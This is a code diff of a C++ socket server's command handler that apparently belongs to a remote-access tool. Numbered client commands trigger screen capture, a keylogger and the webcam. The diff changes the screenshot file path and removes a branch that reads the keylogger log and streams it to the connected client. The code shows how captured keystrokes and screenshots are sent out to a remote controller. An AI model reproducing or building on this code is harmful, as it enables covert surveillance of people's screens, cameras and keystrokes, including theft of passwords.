@@ -75,7 +75,7 @@ void ServerSocket::ProcessClientMessage() {
 	}
 	else if (query == 22) {
 		if (CaptureScreen()) {
-			fstream file("_Data/Screenshot/screenshot.jpg", ios::binary | ios::in);
+			fstream file("_Data/screenshot.jpg", ios::binary | ios::in);
 			file.seekg(0, ios::end);
 			size_t fileSize = file.tellg();
 			file.seekg(0, ios::beg);
@@ -104,32 +104,6 @@ void ServerSocket::ProcessClientMessage() {
 		isKeyloggerOn = false;
 		result = "Y";
 	}
-	else if (query == 25) {
-		fstream file("_Data/KeyLogger/keylogger.txt", ios::binary | ios::in);
-		if (!file.is_open() || !isKeyloggerOn) {
-			cout << "Turn on keyLogger!" << endl; 
-			result = "N";
-		}
-		else {
-			file.seekg(0, ios::end);
-			size_t fileSize = file.tellg();
-			file.seekg(0, ios::beg);
-			result = "F" + to_string(fileSize);
-			Send();
-			char fileBuffer[maxBufferSize];
-			while (fileSize > 0 && fileSize >= maxBufferSize) {
-				file.read(buffer, maxBufferSize);
-				send(clientSocket, buffer, maxBufferSize, 0);
-				fileSize -= maxBufferSize;
-			}
-			if (fileSize > 0) {
-				file.read(buffer, fileSize);
-				send(clientSocket, buffer, fileSize, 0);
-			}
-			file.close();
-			sent = true;
-		}
-	}
 	else if (query == 26) {
 		isWebcamOn = true;
 		result = "Y";
@@ -138,7 +112,7 @@ void ServerSocket::ProcessClientMessage() {
 		isWebcamOn = false;
 		result = "Y";
 	}
-
+	
 	if (sent) return;
 	Send();
 }
